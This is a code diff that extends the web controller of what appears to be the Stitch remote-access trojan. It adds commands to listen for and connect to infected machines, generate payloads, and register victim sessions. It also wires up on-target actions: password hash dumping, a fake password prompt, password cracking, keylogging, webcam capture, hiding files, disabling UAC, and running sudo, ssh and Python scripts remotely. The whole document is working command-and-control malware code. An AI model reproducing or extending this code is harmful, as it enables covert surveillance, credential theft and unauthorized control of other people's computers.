@@ -1112,6 +1112,67 @@ def execute_real_command(command, conn_id=None, parameters=None):
                 return show_aes_keys()
             elif command in ['cls', 'clear']:
                 return "✅ Command logged (screen clear is UI-specific)"
+
+        # Server-level commands (no target required)
+        parts = command.split()
+        if parts:
+            root_cmd = parts[0].lower()
+            if root_cmd == 'listen':
+                # Usage: listen [port]
+                port = '4040'
+                if len(parts) > 1:
+                    try:
+                        port = str(int(parts[1]))
+                    except ValueError:
+                        return f"❌ Invalid port: {parts[1]}"
+                try:
+                    server = get_stitch_server()
+                    server.do_listen(port)
+                    return f"✅ Now listening on port {server.listen_port}"
+                except Exception as e:
+                    return f"❌ Failed to start listener: {str(e)}"
+            elif root_cmd == 'connect':
+                # Usage: connect <host> [port]
+                if len(parts) < 2:
+                    return "❌ Usage: connect <host> [port]"
+                host = parts[1]
+                port_val = 80
+                if len(parts) > 2:
+                    try:
+                        port_val = int(parts[2])
+                    except ValueError:
+                        return f"❌ Invalid port: {parts[2]}"
+                ok, msg = connect_outbound(host, port_val)
+                return msg
+            elif root_cmd == 'history_remove':
+                if len(parts) < 2:
+                    return "❌ Usage: history_remove <target>"
+                target = parts[1]
+                try:
+                    cfg = configparser.ConfigParser()
+                    cfg.read(hist_ini)
+                    if target in cfg.sections():
+                        with open(hist_ini, 'w') as f:
+                            cfg.remove_section(target)
+                            cfg.write(f)
+                        return f"✅ Removed {target} from history"
+                    return f"ℹ️  Target {target} not found in history"
+                except Exception as e:
+                    return f"❌ Failed to update history: {str(e)}"
+            elif root_cmd == 'addkey':
+                if len(parts) < 2:
+                    return "❌ Usage: addkey <encrypted_AES_key>"
+                try:
+                    add_aes(parts[1])
+                    return "✅ AES key processed. Use 'showkey' to verify."
+                except Exception as e:
+                    return f"❌ Failed to add AES key: {str(e)}"
+            elif root_cmd == 'stitchgen':
+                try:
+                    run_exe_gen(auto_confirm=True, create_installers=False)
+                    return "✅ Payload generation initiated (check logs and Configuration/st_main.py)"
+                except Exception as e:
+                    return f"❌ stitchgen failed: {str(e)}"
         
         # Commands that require a connection
         if not conn_id:
@@ -1305,6 +1366,7 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
     import sys
     import signal
     import builtins
+    import getpass as _getpass
     from contextlib import redirect_stdout
     
     # Greenlet-local storage for input queue (works with gevent)
@@ -1410,6 +1472,7 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
         execution_local.input_index = 0
         
         original_input = builtins.input
+        original_getpass = _getpass.getpass
         
         def mock_input(prompt=""):
             """Greenlet-local input mock that won't interfere with other requests"""
@@ -1421,6 +1484,10 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                 return value
             else:
                 return ""  # Return empty instead of blocking
+
+        def mock_getpass(prompt=""):
+            # Reuse the same queue as input
+            return mock_input(prompt)
         
         original_timeout = None
         try:
@@ -1432,6 +1499,7 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
             # CRITICAL: Must restore in finally block to prevent pollution
             if input_queue:
                 builtins.input = mock_input
+                _getpass.getpass = mock_getpass
             
             # Create stitch_commands_library instance
             stlib = stitch_lib.stitch_commands_library(
@@ -1459,6 +1527,10 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                     stlib.screenshot()
                 elif cmd_name == 'hashdump':
                     stlib.hashdump()
+                elif cmd_name == 'askpassword':
+                    stlib.askpassword()
+                elif cmd_name == 'crackpassword':
+                    stlib.crackpassword()
                 elif cmd_name == 'keylogger':
                     if cmd_args.startswith('start'):
                         stlib.keylogger('start')
@@ -1483,16 +1555,29 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                 elif cmd_name == 'webcamlist':
                     stlib.webcamlist()
                 elif cmd_name == 'webcamsnap':
-                    if cmd_args:
-                        stlib.webcamsnap(cmd_args)
-                    else:
-                        return output_header + "❌ Webcamsnap requires device parameter"
+                    # Parameter optional; library handles defaults per OS
+                    stlib.webcamsnap(cmd_args)
                 elif cmd_name == 'displayoff':
                     stlib.displayoff()
                 elif cmd_name == 'displayon':
                     stlib.displayon()
                 elif cmd_name == 'lockscreen':
                     stlib.lockscreen()
+                elif cmd_name == 'fileinfo':
+                    if cmd_args:
+                        stlib.fileinfo(cmd_args)
+                    else:
+                        return output_header + "❌ Fileinfo requires file path parameter"
+                elif cmd_name == 'hide':
+                    if cmd_args:
+                        stlib.hide(cmd_args)
+                    else:
+                        return output_header + "❌ Hide requires file or directory path"
+                elif cmd_name == 'unhide':
+                    if cmd_args:
+                        stlib.unhide(cmd_args)
+                    else:
+                        return output_header + "❌ Unhide requires file or directory path"
                 elif cmd_name == 'disableuac':
                     stlib.disableUAC()
                 elif cmd_name == 'enableuac':
@@ -1513,6 +1598,8 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                     stlib.pwd()
                 elif cmd_name == 'ls':
                     stlib.ls(cmd_args)
+                elif cmd_name == 'dir':
+                    stlib.ls(cmd_args)
                 elif cmd_name == 'location':
                     stlib.location()
                 elif cmd_name == 'vmscan':
@@ -1523,6 +1610,16 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                     stlib.drives()
                 elif cmd_name == 'lsmod':
                     stlib.lsmod(cmd_args)
+                elif cmd_name == 'more':
+                    if cmd_args:
+                        stlib.cat(cmd_args)
+                    else:
+                        return output_header + "❌ More requires file path parameter"
+                elif cmd_name == 'touch':
+                    if cmd_args:
+                        stlib.touch(cmd_args)
+                    else:
+                        return output_header + "❌ Touch requires file path parameter"
                 elif cmd_name == 'download':
                     if cmd_args:
                         stlib.download(cmd_args)
@@ -1564,6 +1661,19 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                         result = stlib.receive()
                     else:
                         return output_header + "❌ Shell requires a command parameter"
+                elif cmd_name == 'pyexec':
+                    if cmd_args:
+                        stlib.pyexec(cmd_args)
+                    else:
+                        return output_header + "❌ Pyexec requires a script name located in Uploads or PyLib"
+                elif cmd_name == 'sudo':
+                    if cmd_args:
+                        stlib.sudo(cmd_args)
+                    else:
+                        return output_header + "❌ Sudo requires a command parameter"
+                elif cmd_name == 'ssh':
+                    # Use interactive parameter queue / getpass mock if provided
+                    stlib.ssh()
                 # Interactive commands now supported with parameter queue
                 elif cmd_name == 'firewall':
                     if not cmd_args:
@@ -1640,8 +1750,9 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
             import traceback
             return output_header + f"❌ Execution error: {str(e)}\n\nType: {type(e).__name__}\n\nTraceback: {traceback.format_exc()[-500:]}"
         finally:
-            # CRITICAL: Always restore original input() to prevent global state pollution
+            # CRITICAL: Always restore original input() and getpass to prevent global state pollution
             builtins.input = original_input
+            _getpass.getpass = original_getpass
             # Restore socket timeout
             try:
                 if original_timeout is not None:
@@ -1658,6 +1769,70 @@ def get_connection_aes_key(target_ip):
     if ctx:
         return ctx.get('aes_key')
     return None
+
+
+def connect_outbound(host: str, port: int):
+    """Connect to a remote Stitch payload (bind mode) and register as an active connection.
+    Returns (ok, message)."""
+    try:
+        server = get_stitch_server()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(8)
+        s.connect((host, port))
+
+        # Confirm magic string (unencrypted)
+        expected = base64.b64encode(b'stitch_shell')
+        confirm = server.receive(s, encryption=False)
+        if confirm != expected:
+            s.close()
+            return False, "❌ Non-stitch application responded on remote host"
+
+        # Receive AES identifier (unencrypted)
+        aes_id_bytes = server.receive(s, encryption=False)
+        aes_id = aes_id_bytes.decode('utf-8') if isinstance(aes_id_bytes, bytes) else aes_id_bytes
+
+        # Lookup AES key
+        aes_lib = configparser.ConfigParser()
+        aes_lib.read(st_aes_lib)
+        if aes_id not in aes_lib.sections():
+            s.close()
+            return False, (
+                "❌ The connection uses an AES key not found in the AES library.\n"
+                "[*] Use 'addkey <key>' to add it first."
+            )
+        aes_key_b64 = aes_lib.get(aes_id, 'aes_key')
+        aes_key = base64.b64decode(aes_key_b64)
+
+        # Receive metadata (encrypted)
+        os_first = stitch_lib.st_receive(s, aes_key, as_string=True)
+        os_second = stitch_lib.st_receive(s, aes_key, as_string=True)
+        user = stitch_lib.st_receive(s, aes_key, as_string=True)
+        hostname = stitch_lib.st_receive(s, aes_key, as_string=True)
+        platform_str = stitch_lib.st_receive(s, aes_key, as_string=True)
+
+        chosen_os = os_second or os_first or 'Unknown'
+        conn_id = f"{host}:{port}"
+        # Register in server
+        server.inf_sock[conn_id] = s
+        server.inf_port[conn_id] = port
+
+        connection_context[conn_id] = {
+            'aes_key': aes_key,
+            'os': chosen_os,
+            'platform': platform_str,
+            'hostname': hostname or conn_id,
+            'user': user or 'Unknown',
+            'port': port,
+            'connected_at': datetime.now().isoformat(),
+        }
+
+        return True, f"✅ Connected to {conn_id} ({chosen_os})"
+    except Exception as e:
+        try:
+            s.close()
+        except Exception:
+            pass
+        return False, f"❌ Connect failed: {str(e)}"
 
 def get_sessions_output():
     """Get active sessions output"""
